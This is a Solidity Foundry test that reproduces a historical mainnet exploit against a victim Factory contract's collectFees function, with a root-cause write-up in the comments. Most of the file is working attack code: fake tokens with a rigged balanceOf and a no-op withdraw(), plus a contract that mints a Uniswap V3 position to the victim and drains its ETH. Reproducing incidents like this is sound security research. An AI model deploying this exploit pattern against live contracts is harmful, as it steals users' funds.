// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 2,383.25 USD
// Attacker : 0xad2cb8f48e74065a0b884af9c5a4ecbba101be23
// Attack Contract : 0x0c76c4911d92b99d0dab0a8a90b73e9ae3bc940f
// Vulnerable Contract : 0x930f9fa91e1e46d8e44abc3517e2965c6f9c4763
// Attack Tx : https://etherscan.io/tx/0x837752ca27743c9b37d901ff6cf9cdbe98b6097c660394a390de075455d8ccea
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x930f9fa91e1e46d8e44abc3517e2965c6f9c4763#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1366
//
// Attack summary: the attacker deployed fake ERC20 tokens, created a Uniswap V3 pool for them, minted
// a fee-earning NFT position to the victim Factory, generated fake token fees, then called
// Factory.collectFees(tokenId). The fake token reports an inflated victim balance once the victim
// holds any fake tokens.
// Root cause: collectFees authorizes the caller through token0.creator() and assumes token1 is WETH
// without requiring token1 == WETH. A fake token1 can implement a no-op withdraw(), after which the
// Factory sends real ETH to the fake token creator.

address constant ATTACKER = address(uint160(0x00ad2cb8f48e74065a0b884af9c5a4ecbba101be23));
address constant HISTORICAL_ATTACK_CONTRACT = address(uint160(0x000c76c4911d92b99d0dab0a8a90b73e9ae3bc940f));
address constant VICTIM_FACTORY = address(uint160(0x00930f9fa91e1e46d8e44abc3517e2965c6f9c4763));
address constant POSITION_MANAGER = address(uint160(0x00c36442b4a4522e871399cd717abdd847ab11fe88));
address constant SWAP_ROUTER = address(uint160(0x0068b3465833fb72a70ecdf485e0e4c7bd8665fc45));

uint24 constant POOL_FEE = 500;
uint160 constant SQRT_PRICE_1_1 = 79_228_162_514_264_337_593_543_950_336;
int24 constant MIN_TICK_500 = -887_270;
int24 constant MAX_TICK_500 = 887_270;
uint256 constant LP_AMOUNT = 100 ether;
uint256 constant SWAP_AMOUNT = 10 ether;
uint256 constant HISTORICAL_ETH_PROFIT = 979_332_749_999_999_999;

interface IVictimFactory1366 {
    function collectFees(
        uint256 tokenId
    ) external returns (uint256 amount0, uint256 amount1);
}

interface INonfungiblePositionManager1366 {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function createAndInitializePoolIfNecessary(address token0, address token1, uint24 fee, uint160 sqrtPriceX96)
        external
        payable
        returns (address pool);

    function mint(
        MintParams calldata params
    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface ISwapRouter1366 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_801_926);
        vm.roll(22_801_927);
        vm.warp(0x685fb053);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(VICTIM_FACTORY, "Victim Factory");
        vm.label(POSITION_MANAGER, "Uniswap V3 position manager");
        vm.label(SWAP_ROUTER, "Uniswap V3 swap router");
    }

    function testExploit() public balanceLog {
        uint256 attackerEthBefore = ATTACKER.balance;

        FactoryFeeAttack attack = new FactoryFeeAttack(ATTACKER);
        vm.deal(address(attack), 0);

        vm.prank(ATTACKER);
        attack.execute();

        assertEq(ATTACKER.balance - attackerEthBefore, HISTORICAL_ETH_PROFIT);
    }
}

contract FactoryFeeAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    receive() external payable {}

    function execute() external {
        FakeCreatorToken tokenA = new FakeCreatorToken("Fake Alpha", "FALPHA");
        FakeCreatorToken tokenB = new FakeCreatorToken("Fake Wrapped ETH", "FWETH");

        address token0 = address(tokenA) < address(tokenB) ? address(tokenA) : address(tokenB);
        address token1 = token0 == address(tokenA) ? address(tokenB) : address(tokenA);

        IERC20(token0).approve(POSITION_MANAGER, type(uint256).max);
        IERC20(token1).approve(POSITION_MANAGER, type(uint256).max);
        IERC20(token1).approve(SWAP_ROUTER, type(uint256).max);

        INonfungiblePositionManager1366(POSITION_MANAGER).createAndInitializePoolIfNecessary(
            token0, token1, POOL_FEE, SQRT_PRICE_1_1
        );

        (uint256 tokenId,,,) = INonfungiblePositionManager1366(POSITION_MANAGER).mint(
            INonfungiblePositionManager1366.MintParams({
                token0: token0,
                token1: token1,
                fee: POOL_FEE,
                tickLower: MIN_TICK_500,
                tickUpper: MAX_TICK_500,
                amount0Desired: LP_AMOUNT,
                amount1Desired: LP_AMOUNT,
                amount0Min: 0,
                amount1Min: 0,
                recipient: VICTIM_FACTORY,
                deadline: block.timestamp
            })
        );

        ISwapRouter1366(SWAP_ROUTER).exactInputSingle(
            ISwapRouter1366.ExactInputSingleParams({
                tokenIn: token1,
                tokenOut: token0,
                fee: POOL_FEE,
                recipient: VICTIM_FACTORY,
                amountIn: SWAP_AMOUNT,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        IVictimFactory1366(VICTIM_FACTORY).collectFees(tokenId);

        payable(profitReceiver).transfer(address(this).balance);
    }
}

contract FakeCreatorToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public immutable creator;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory tokenName, string memory tokenSymbol) {
        name = tokenName;
        symbol = tokenSymbol;
        creator = msg.sender;
        totalSupply = 1_000_000 ether;
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(
        address account
    ) external view returns (uint256) {
        if (account == VICTIM_FACTORY && balances[account] != 0) return HISTORICAL_ETH_PROFIT * 2;
        return balances[account];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allowance");
            allowance[from][msg.sender] = allowed - amount;
        }

        _transfer(from, to, amount);
        return true;
    }

    function withdraw(
        uint256
    ) external pure {}

    function _transfer(address from, address to, uint256 amount) private {
        require(balances[from] >= amount, "balance");
        balances[from] -= amount;
        balances[to] += amount;
    }
}
